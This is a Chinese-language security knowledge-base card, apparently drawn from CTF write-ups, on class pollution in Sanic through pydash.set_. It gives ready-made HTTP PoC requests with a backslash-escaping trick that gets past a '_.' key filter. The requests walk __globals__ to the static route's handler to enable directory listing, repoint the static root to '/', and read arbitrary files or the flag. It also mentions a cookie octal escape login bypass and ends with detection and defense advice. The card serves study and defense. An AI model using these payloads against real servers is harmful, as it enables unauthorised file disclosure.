---
id: web-python-framework-sanic-static-handler-keywords-pollution
title: Sanic static handler 关键词污染：pydash.set_ 沿 __class__.__init__.__globals__ 改 directory_view/_parts/file_or_directory 实现目录遍历与任意文件读取
type: scenario
domain: web
path: web/python/framework
technique: sanic-static-handler-keywords-pollution
tags:
- python
- sanic
- pydash
- class-pollution
- attribute-pollution
- static-handler
- directory-view
- arbitrary-file-read
- pathlib
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V291
  verified_at: '2026-11-08T08:16:51+08:00'
  notes: 已对照原文与19张图核对：pydash.set_路径、Cookie八进制登录、app.static handler.keywords.directory_handler/directory_view/directory._parts/file_or_directory、__file__ 四条利用面及DASCTF过滤变体均一致；已用pydash 5.1.2源码核对 RE_PATH_KEY_DELIM/unescape_path_key，用http.cookies验证\073解码为分号。原pydash 5.1.2/Sanic 3.11.2仅为原文挑战与复现环境版本，非受影响区间，已按brief清除affected_versions。未执行原文exploit。
url: /docs/web/python/framework/web-python-framework-sanic-static-handler-keywords-pollution/
draft: false
kb_aliases:
- CISCN Sanic 原型链污染
- Sanic 类污染
- app.static 污染
- directory_view 目录查看器
- directory._parts 根目录
- file_or_directory 任意文件读取
- __file__ 污染读 flag
- pydash.set_ Sanic
---

## 一句话结论

Sanic 应用把用户可控的 `key`/`value` 交给 `pydash.set_(Pollute(), key, value)` 时，key 可以沿 `__class__.__init__.__globals__.app.router.name_index.__mp_main__.static.handler.keywords...` 一路跳到 `app.static()` 注册时生成的部分函数 `keywords` 字典：污染 `directory_handler.directory_view=True` 打开目录浏览、污染 `directory_handler.directory._parts=["/"]` 把静态根切到根目录、污染 `file_or_directory="/"` 直接从根目录下载任意文件，或污染模块全局 `__file__` 让 `/src` 的 `open(__file__).read()` 读出 flag。

## 原理

- **注入点**：`/admin` 路由在 `session['admin']` 为真后取 `request.json['key']`、`request.json['value']`，只检查 `key` 是字符串且 `'_.' not in key`，然后 `pydash.set_(pollute, key, value)`。`pydash.set_` 按点分路径逐段 `getattr/setitem`，不禁止 `__class__`、`__init__`、`__globals__` 等 dunder 属性。
- **路径转义绕过 `_.` 过滤**（pydash 5.1.2 的 `to_path_tokens`）：分隔符正则为 `(?<!\\)(?:\\\\)*\.`，即“偶数个反斜杠 + 点”才作为分隔符，且反斜杠被消耗；单个反斜杠 + 点表示键名里的字面点。因此：
  - `__class__\\.__init__`（原文 JSON 里写成 `__class__\\\\.__init__`，解码后是两个反斜杠）在原始字符串里是 `_` `\` `\` `.`，不含连续子串 `_.`，绕过 WAF；pydash 又把它当分隔符，得到路径段 `__class__`、`__init__`。
  - `__mp_main__\.static`（单反斜杠）被当作一个整体键名 `__mp_main__.static`，正好命中 `app.router.name_index` 中以模块名+点+函数名保存的路由名字典键。
- **可达对象链**：`Pollute()` 实例 → `__class__`（Pollute 类）→ `__init__`（函数）→ `__globals__`（模块全局字典）→ `app`（Sanic 实例）→ `router` → `name_index`（路由名→Route 字典）→ `__mp_main__.static` → Route → `handler`（`app.static()` 内部注册的 `functools.partial`）→ `keywords`（`static()` 的关键字参数字典）→ `directory_handler`（`DirectoryHandler` 实例）/`file_or_directory` 等。
- **DirectoryHandler/Path 内部字段**：`DirectoryHandler.__init__` 保存 `self.base = uri.strip('/')`、`self.directory = directory`、`self.directory_view = directory_view`、`self.index = tuple(index)`。`directory` 是 `Path` 类实例，内部用 `_parts` 表示路径分段（例如 `('C:\\','Users',...,'static')`）；把 `_parts` 改成 `['/']` 即可改变静态目录解析结果。
- **利用效果**：
  - `directory_handler.directory_view = True`：Sanic 静态路由回退到目录查看器，`/static/` 从 500 变为列出目录内容（可当 ls 用）。
  - `directory_handler.directory._parts = ["/"]`：目录查看器列出的根变成 `/`，可直接看到根目录下的 flag 文件名（该链需要列表值）。
  - `keywords.file_or_directory = "/"`：静态路由的文件来源改成根目录，访问 `/static/<文件名>` 即以静态文件响应下载任意文件。
  - `__init__.__globals__.__file__ = "/****flag"`：`/src` 路由的 `text(open(__file__).read())` 在运行时从模块全局读取 `__file__`，污染后改读 flag 文件，访问 `/src` 即回显 flag（本题预期解）。
- **为什么能持久生效**：污染的是进程内单例对象（Sanic app、router、partial 的关键字、DirectoryHandler 实例、模块全局），修改对所有后续请求生效，无需重复污染。

## 触发条件

- Python Sanic 应用使用 `pydash.set_()` 处理用户可控的路径与值，且未对路径段做 dunder 黑名单。
- 应用通过 `app.static(uri, file_or_directory)` 注册了静态路由（本链依赖其 handler 的 `keywords`/`directory_handler` 可达）。
- 攻击者能进入调用 `pydash.set_` 的路由（本例需先通过登录/session 校验，见关联的 Cookie 八进制绕过卡）。
- WAF 只做 `'_.' not in key` 这类字符串检查，且 pydash 版本支持反斜杠转义路径（5.1.2 已验证）。
- 需要列表值的链（`_parts`）要求 value 类型未被限制为字符串；DASCTF 变体禁掉 list 后该子链失效，但 `directory_view` 仍可污染。

## 利用步骤

1. 获取源码（如 `/src` 路由或题目泄露），确认 `pydash.set_` 的调用与 key 过滤规则。
2. 先满足访问前提（本例用 `Cookie: user="adm\073n"` 通过登录，详见关联卡）。
3. 污染目录查看器：POST `/admin`
   `{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value":"True"}`
4. 访问 `/static/` 验证目录查看器生效。
5. 污染静态根：`...keywords.directory_handler.directory._parts`，value 为 `["/"]`，再访问 `/static/` 列出根目录并找到 flag 文件名。
6. 任意文件读：`...keywords.file_or_directory`，value 为 `"/"`，访问 `/static/<文件名>` 下载。
7. 或污染 `__file__`：`{"key":"__init__\\\\.__globals__\\\\.__file__","value":"/****flag"}`，访问 `/src` 回显 flag。

## PoC

```http
POST /admin HTTP/1.1
Content-Type: application/json
Cookie: session=<登录后 session>

{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value":"True"}
```

```http
POST /admin HTTP/1.1
Content-Type: application/json
Cookie: session=<登录后 session>

{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts","value":["/"]}
```

```http
POST /admin HTTP/1.1
Content-Type: application/json
Cookie: session=<登录后 session>

{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory","value":"/"}
```

```http
POST /admin HTTP/1.1
Content-Type: application/json
Cookie: session=<登录后 session>

{"key":"__init__\\\\.__globals__\\\\.__file__","value":"/****flag"}
```

注意：HTTP body 是 JSON，路径分隔符在 JSON 原文里要写成四个反斜杠 + 点（\\\\），JSON 解码后变成两个反斜杠 + 点，pydash 才把它当分隔符；`__mp_main__` 与 `static` 之间在 JSON 原文里写两个反斜杠 + 点（\\），解码后是一个反斜杠 + 点，pydash 当作键名里的字面点。

## 变体与关联

- 变体：DASCTF Sanic's revenge 用 `'parts' not in key`、`'proc' not in str(value)`、`type(value) is not list` 过滤，封死 `_parts` 列表链；但 `directory_view=True` 仍可污染，可用于目录浏览，再结合文件名/其他读取面找 flag。
- 变体：同一链条可改 `__file__` 让 `/src` 读 flag，或改 `file_or_directory` 把静态路由变成任意文件下载。
- 关联：[[web-python-pydash-set-attribute-path-pollution]] 是 pydash.set_ 路径穿越的通用原理与 Flask 场景；[[web-python-framework-pydash-set-jinja-loader-searchpath]] 是同一原语打 Flask 模板加载器。
- 关联：[[web-generic-auth-cookie-octal-escape-semicolon-check-bypass]] 是本例进入 `/admin` 的登录绕过。

## 检测与防御

- 检测：`pydash.set_`/`setattr` 的路径是否来自请求；key 中是否出现 `__class__`、`__init__`、`__globals__`、`keywords`、`directory_handler`、`_parts` 等片段；静态路由是否被意外打开目录浏览。
- 防御：不要把用户输入当路径；使用字段白名单/固定 schema；对路径段拒绝以 `__` 开头或包含 `__globals__` 等 dunder；升级/替换 pydash 并配置禁止魔术属性；静态目录使用只读白名单目录，关闭 `directory_view`。
